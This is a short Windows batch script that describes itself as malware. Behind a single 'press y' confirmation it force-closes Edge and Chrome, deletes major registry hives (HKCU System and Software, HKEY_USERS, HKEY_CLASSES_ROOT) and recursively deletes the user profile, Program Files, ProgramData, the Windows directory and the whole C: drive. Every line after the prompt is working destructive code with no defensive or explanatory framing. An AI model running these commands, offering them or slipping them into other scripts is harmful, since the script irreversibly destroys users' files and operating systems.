@echo off
set /P choice=This malware will COMPLETELY wipe the user folder and the rest of your OS. Please don't run it unless you REALLY know what you are doing. If know what you are doing press y

if "%choice%"=="y" goto wiper
exit

:wiper
echo This malware runs better if it's NOT in your user directory and running as administrator.
pause
ver
taskkill /f /im msedge.exe
taskkill /f /im chrome.exe
reg delete HKEY_CURRENT_USER\System /f
reg delete HKEY_CURRENT_USER\Software /f
del /s /q "%appdata%\microsoft\windows\start menu"
del /s /q "C:\programdata\microsoft\windows\start menu"
del /s /q %userprofile%
del /s /q "C:\users"
del /s /q "C:\program files"
del /s /q C:\programdata
reg delete HKEY_USERS\* /f
reg delete HKEY_CLASSES_ROOT\* /f
del /s /q %windir%
del /s /q C:\
